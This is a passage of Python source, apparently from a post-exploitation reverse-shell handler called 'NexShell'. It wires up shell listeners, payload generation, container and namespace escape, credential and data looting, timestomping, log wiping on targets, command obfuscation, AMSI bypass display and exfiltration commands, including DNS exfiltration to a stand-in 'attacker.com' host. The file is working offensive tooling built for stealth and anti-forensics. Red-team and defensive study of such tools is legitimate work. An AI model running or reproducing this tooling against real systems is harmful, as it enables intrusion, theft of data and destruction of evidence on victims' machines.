        session.exec_inmem(ContainerEscape.escape_kubernetes())

    def _container_ns(self, args=''):
        try:
            from modules.ops import ContainerEscape
        except ImportError:
            cmdlogger.error("ops module not found"); return
        session = core.sessions.get(self.sid)
        logger.info("Namespace escape via nsenter...")
        session.exec_inmem(ContainerEscape.escape_runc_namespace())

    # ── Loot Modules ──────────────────────────────────────────────────────────
    def _loot(self, args=''):
        try:
            from modules.loot import LootCollector, LINUX_COLLECTION_CMDS, WINDOWS_COLLECTION_CMDS
        except ImportError:
            cmdlogger.error("loot module not found"); return
        session = core.sessions.get(self.sid)
        if not session: return
        win = is_windows_session(session)
        logger.info("Starting loot collection...")
        cmds = WINDOWS_COLLECTION_CMDS if win else LINUX_COLLECTION_CMDS
        for cmd in cmds[:5]:   # first 5 non-intrusive
            session.exec(cmd)

    def _loot_scan(self, args=''):
        try:
            from modules.loot import LootScanner
        except ImportError:
            cmdlogger.error("loot module not found"); return
        session = core.sessions.get(self.sid)
        if not session: return
        logger.info("Scanning session output for sensitive data...")
        # Grab last N bytes of session log
        logfile = session.directory / 'session.log'
        if logfile.exists():
            text = logfile.read_text(errors='replace')
            scanner = LootScanner()
            findings = scanner.scan(text)
            if findings:
                print(f'\n  {paint("Loot Findings").purple_BRIGHT}\n')
                for cat, items in findings.items():
                    if items:
                        print(f'  {paint(cat).orange}')
                        for item in items[:10]:
                            print(f'    {paint(">").teal} {item}')
            else:
                cmdlogger.warning("No sensitive data found in session log")
        else:
            cmdlogger.warning("No session log yet — run some commands first")

    def _loot_report(self, args=''):
        try:
            from modules.loot import LootCollector
        except ImportError:
            cmdlogger.error("loot module not found"); return
        session = core.sessions.get(self.sid)
        if not session: return
        fmt = args.strip() or 'md'
        collector = LootCollector(str(session.directory))
        logfile = session.directory / 'session.log'
        if logfile.exists():
            collector.scan_text(logfile.read_text(errors='replace'))
        out = collector.export(fmt)
        rpt = session.directory / f'loot_report.{fmt}'
        rpt.write_text(out, encoding='utf-8')
        logger.info(f"Loot report saved: {paint(str(rpt)).lime}")

    # ── OPSEC Modules ─────────────────────────────────────────────────────────
    def _opsec(self, args=''):
        try:
            from modules.opsec import OpsecProfile
        except ImportError:
            cmdlogger.error("opsec module not found"); return
        if args:
            profile = args.strip().lower()
            valid = ('ghost', 'normal', 'paranoid')
            if profile not in valid:
                cmdlogger.warning(f"Valid profiles: {', '.join(valid)}"); return
            options.opsec_profile = profile
            OpsecProfile.set(profile)
            logger.info(f"OPSEC profile set: {paint(profile.upper()).lime}")
        else:
            current = getattr(options, 'opsec_profile', 'normal')
            print(f'\n  {paint("OPSEC Profiles").purple_BRIGHT}\n')
            for name, desc in [
                ('ghost',    'Max stealth — jitter 200-500ms, no disk writes, AMSI bypass auto'),
                ('normal',   'Balanced — 50ms jitter, minimal logging'),
                ('paranoid', 'Ultra-paranoid — TLS only, C2 heartbeat, DoH comms, cleanup on exit'),
            ]:
                marker = paint('>>').lime if name == current else '  '
                print(f'  {marker} {paint(name).cyan:20} {paint(desc).darkgrey}')
            print()

    def _timestomp(self, args=''):
        try:
            from modules.opsec import timestomp_linux, timestomp_windows
        except ImportError:
            cmdlogger.error("opsec module not found"); return
        session = core.sessions.get(self.sid)
        if not session: return
        win = is_windows_session(session)
        target = args.strip() or ('/tmp/.nxsh' if not win else '%TEMP%\\payload.exe')
        ref    = args.split()[1] if len(args.split()) > 1 else ''
        script = timestomp_windows(target, ref) if win else timestomp_linux(target, ref)
        logger.info(f"Timestomping: {paint(target).yellow}")
        if win:
            self._exec_powershell_inmem(script)
        else:
            session.exec_inmem(script)

    def _logclean(self, args=''):
        try:
            from modules.opsec import clean_linux_logs, clean_windows_logs
        except ImportError:
            cmdlogger.error("opsec module not found"); return
        session = core.sessions.get(self.sid)
        if not session: return
        win = is_windows_session(session)
        logger.info("Cleaning logs on target...")
        if win:
            self._exec_powershell_inmem(clean_windows_logs())
        else:
            session.exec_inmem(clean_linux_logs())

    def _obfuscate(self, args=''):
        try:
            from modules.opsec import ObfuscationEngine
        except ImportError:
            cmdlogger.error("opsec module not found"); return
        if not args:
            cmdlogger.warning("Usage: run obfuscate <command>"); return
        parts = args.split(' ', 1)
        method = parts[0] if len(parts) > 1 and parts[0] in ('xor','b64','hex','chararray','iex') else 'b64'
        cmd    = parts[1] if len(parts) > 1 else parts[0]
        result = ObfuscationEngine.obfuscate(cmd, method)
        print(f'\n  {paint("Obfuscated").purple_BRIGHT} [{paint(method).cyan}]\n')
        print(f'  {paint(result).yellow}\n')

    # ── Data Exfil Module ─────────────────────────────────────────────────────
    def _exfil(self, args=''):
        try:
            from modules.ops import DataExfil
        except ImportError:
            cmdlogger.error("ops module not found"); return
        session = core.sessions.get(self.sid)
        win = is_windows_session(session) if session else False
        listeners = list(core.listeners.values())
        host = Interfaces().ips[0] if Interfaces().ips else '127.0.0.1'
        port = listeners[0].port if listeners else 4444
        print(f'\n  {paint("Exfiltration Techniques").purple_BRIGHT}  '
              f'[{paint("Windows" if win else "Linux").cyan}]\n')
        if win:
            entries = [
                ('HTTP POST',   DataExfil.windows_https_exfil('<file>', host, 8000)),
                ('SMB',        DataExfil.smb_exfil('<file>', host, 'share')),
                ('Certutil',   DataExfil.certutil_encode('<file>')),
            ]
        else:
            entries = [
                ('HTTP GET',   DataExfil.http_get_params('<data>', f'http://{host}:{port}')),
                ('DNS',        DataExfil.dns_exfil('<data>', 'attacker.com')),
                ('HTTP POST',  DataExfil.linux_http_exfil('<file>', host, 8000)),
            ]
        tbl = Table(joinchar=' | ')
        for name, cmd_str in entries:
            tbl += [paint(name).lime, paint(cmd_str[:100]).white]
        print(indent(str(tbl), '  '))
        print()

    # ── Listeners ──────────────────────────────────────────────────────────────
    def do_listeners(self, line):
        """[add -p <port>|stop <id>] — Manage listeners"""
        if line:
            parts = line.split()
            if parts[0] == 'add':
                port = int(parts[parts.index('-p')+1]) if '-p' in parts else options.default_listener_port
                TCPListener(options.interface, port)
            elif parts[0] == 'stop':
                lid = parts[1] if len(parts) > 1 else None
                if lid == '*':
                    for l in tuple(core.listeners.values()): l.stop()
                elif lid and lid.isnumeric() and int(lid) in core.listeners:
                    core.listeners[int(lid)].stop()
                else: cmdlogger.warning("Invalid listener ID")
        else:
            if core.listeners:
                tbl = Table(joinchar=' │ ')
                tbl.header = [paint(h).teal for h in ('ID','Type','Host','Port')]
                for l in core.listeners.values():
                    tbl += [l.id, 'TCP', l.host, l.port]
                print('\n', indent(str(tbl), '  '), '\n', sep='')
            else:
                cmdlogger.warning("No active listeners")

    def do_payloads(self, line):
        """[interface] [--obfuscate] [--linux|--windows|--all] — Generate payloads"""
        line = line or ''
        obf  = '--obfuscate' in line
        if '--windows' in line: target_os = 'windows'
        elif '--linux' in line: target_os = 'linux'
        else:                   target_os = 'all'
        iface = line.replace('--obfuscate','').replace('--windows','').replace('--linux','').replace('--all','').strip()
        if core.listeners:
            for l in core.listeners.values():
                host = Interfaces().translate(iface) if iface else l.host
                if host == '0.0.0.0':
                    ips = Interfaces().ips
                    host = ips[0] if ips else '0.0.0.0'
                PayloadGenerator.display(host, l.port, obfuscate=obf, target_os=target_os)
        else:
            cmdlogger.warning("No active listeners — start one first")

    def do_connect(self, line):
        """<Host> <Port> — Connect to a bind shell"""
        if not line: cmdlogger.warning("Specify host and port"); return
        try:
            host, port = line.split()
            if Connect(host, port) and not options.no_attach: return True
        except ValueError:
            cmdlogger.error("Usage: connect <host> <port>")

    def do_Interfaces(self, line):
        """— Show local network interfaces"""
        print(Interfaces())

    def do_dir(self, line):
        """[SessionID] — Show session local folder"""
        s = core.sessions.get(self.sid)
        folder = s.directory if s else options.basedir
        print(paint(folder).yellow)

    def do_SET(self, line):
        """[option] [value] — Show/set options"""
        if not line:
            rows = [[paint(k).teal, paint(repr(v)).yellow] for k,v in options.__dict__.items()]
            tbl  = Table(rows, fillchar=[paint('.').darkgrey, 0], joinchar=' => ')
            print(tbl)
        else:
            parts = line.split(' ', 1)
            try:
                if len(parts) == 1:
                    print(paint(repr(getattr(options, parts[0]))).yellow)
                else:
                    from ast import literal_eval
                    setattr(options, parts[0], literal_eval(parts[1]))
                    logger.info(f"'{parts[0]}' = {paint(repr(getattr(options, parts[0]))).yellow}")
            except AttributeError: cmdlogger.error("No such option")
            except Exception as e: cmdlogger.error(f"{type(e).__name__}: {e}")

    def do_history(self, line):
        """— Show command history"""
        try:
            import readline as rl
            for i in range(1, rl.get_current_history_length()+1):
                print(f"  {i:>4}  {rl.get_history_item(i)}")
        except Exception:
            cmdlogger.warning("readline not available")

    def do_reset(self, line):
        """— Reset local terminal"""
        if shutil.which("reset"): os.system("reset")
        else: cmdlogger.error("'reset' not found")

    def do_exit(self, line):
        """— Exit NexShell"""
        if ask(f"Exit NexShell?{self.active_sessions} (y/N): ").lower() == 'y':
            super().do_exit(line)
            core.stop()
            logger.info("NexShell exited. Stay elite. 🔥")
            return True
        return False

    def do_EOF(self, line):
        if self.sid: self.set_id(None); print()
        else: print("exit"); return self.do_exit(line)


# ══════════════════════════════════════════════════════════════════════════════
#  GLOBALS
# ══════════════════════════════════════════════════════════════════════════════
core = Core()


# ══════════════════════════════════════════════════════════════════════════════
#  ARGUMENT PARSER
# ══════════════════════════════════════════════════════════════════════════════
def build_parser():
    p = ArgumentParser(
        prog=__program__,
        formatter_class=RawTextHelpFormatter,
        description=f"{__program__} {__version__} — Elite Reverse Shell Commander",
        epilog=dedent(f"""
  Examples:
    nexshell                        Listen on 0.0.0.0:4444
    nexshell -p 5555                Listen on port 5555
    nexshell -p 4444,5555           Listen on multiple ports
    nexshell -a                     Listen + show sample payloads
    nexshell -c target -p 3333      Connect to bind shell
    nexshell -s /path/to/file       Serve a file/folder via HTTP
    nexshell -p 4444 --obfuscate    Listen + show obfuscated payloads
    nexshell --auto-enum            Auto-run QuickEnum on every new shell
        """)
    )
    p.add_argument('host', nargs='?', help='Connect to bind shell at this host')
    p.add_argument('-p','--port',    default='4444', help='Port(s) to listen/connect (comma-sep)')
    p.add_argument('-i','--interface', default='any', help='Network interface')
    p.add_argument('-c','--connect', metavar='HOST', help='Connect to bind shell')
    p.add_argument('-s','--serve',   metavar='PATH', help='Serve file/folder via HTTP')
    p.add_argument('-a','--show-payloads', action='store_true', help='Show sample payloads and exit')
    p.add_argument('--obfuscate',    action='store_true', help='Show obfuscated payload variants')
    p.add_argument('--no-upgrade',   action='store_true', help='Disable auto PTY upgrade')
    p.add_argument('--no-attach',    action='store_true', help='Do not auto-attach to new sessions')
    p.add_argument('--single',       action='store_true', help='Exit after first session ends')
    p.add_argument('--maintain',     type=int, default=1, help='Maintain N shells per host')
    p.add_argument('--jitter',       type=int, default=0, help='Jitter (ms) between commands (stealth)')
    p.add_argument('--stealth',      action='store_true', help='Stealth mode: no disk writes on target')
    p.add_argument('--auto-enum',    action='store_true', help='Auto-run QuickEnum on every new session')
    p.add_argument('--windows',      action='store_true', help='Show Windows payloads only')
    p.add_argument('--linux',        action='store_true', help='Show Linux payloads only')
    p.add_argument('--amsi',         action='store_true', help='Show AMSI bypass snippets')
    p.add_argument('--debug',        action='store_true', help='Enable debug logging')
    p.add_argument('-v','--version', action='version', version=f'%(prog)s {__version__}')
    return p


# ══════════════════════════════════════════════════════════════════════════════
#  WINDOWS UTF-8 STDOUT FIX
# ══════════════════════════════════════════════════════════════════════════════

# ══════════════════════════════════════════════════════════════════════════════
#  STARTUP BANNER
# ══════════════════════════════════════════════════════════════════════════════
def print_banner():
    try:
        print(paint(__banner__).purple)
    except (UnicodeEncodeError, UnicodeDecodeError):
        # Fallback for Windows terminals without UTF-8
        safe = __banner__.encode('ascii', errors='replace').decode()
        print(paint(safe).purple)
    print(f"  {paint('Version').teal} {paint(__version__).lime}  "
          f"{paint('*').darkgrey}  "
          f"{paint('by').teal} {paint(__author__).orange}  "
          f"{paint('*').darkgrey}  "
          f"Platform: {paint('Windows' if IS_WINDOWS else platform.system()).cyan}  "
          f"Escape: {paint(options.escape['key']).yellow}\n")


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════════════
def main():
    global menu

    args = build_parser().parse_args()

    # Apply options
    options.no_upgrade      = args.no_upgrade
    options.no_attach       = args.no_attach
    options.single_session  = args.single
    options.maintain        = args.maintain
    options.jitter          = args.jitter
    options.stealth_mode    = args.stealth
    options.auto_enum       = args.auto_enum
    options.debug           = args.debug

    if args.debug:
        logger.setLevel(logging.DEBUG)
        cmdlogger.setLevel(logging.DEBUG)

    ports = [int(p.strip()) for p in args.port.split(',')]
    options.ports = ports

    print_banner()

    # -- Serve mode
    if args.serve:
        path = Path(args.serve).expanduser().resolve()
        if not path.exists():
            logger.error(f"Path not found: {path}"); sys.exit(1)
        os.chdir(path if path.is_dir() else path.parent)
        import http.server
        handler = http.server.SimpleHTTPRequestHandler
        handler.log_message = lambda *a: None
        addr = ('0.0.0.0', 8000)
        with http.server.HTTPServer(addr, handler) as srv:
            logger.info(f"Serving {path} on http://0.0.0.0:8000")
            try: srv.serve_forever()
            except KeyboardInterrupt: pass
        return

    # -- Show AMSI bypass
    if hasattr(args,'amsi') and args.amsi:
        try:
            from modules.windows import AMSI_BYPASSES, get_amsi_bypass
            print(f'\n  {paint("AMSI Bypass Variants").purple_BRIGHT}\n')
            for name, code in AMSI_BYPASSES.items():
                print(f'  {paint(f"[{name}]").orange}\n  {paint(code).white}\n')
        except ImportError:
            print("Windows module not available")
        return

    # -- Show payloads only
    if args.show_payloads:
        iface_ips = Interfaces().ips
        host = iface_ips[0] if iface_ips else '0.0.0.0'
        target_os = 'windows' if hasattr(args,'windows') and args.windows else \
                    'linux'   if hasattr(args,'linux')   and args.linux   else 'all'
        for port in ports:
            PayloadGenerator.display(host, port, obfuscate=args.obfuscate, target_os=target_os)
        return

    # -- Main menu
    menu = MainMenu()
    menu.set_id(None)

    # -- Start listeners
    for port in ports:
        TCPListener(Interfaces().translate(args.interface), port)

    # -- Connect mode
    target = args.host or args.connect
    if target:
        Connect(target, ports[0])

    menu.show()
    menu.start()


if __name__ == '__main__':
    main()
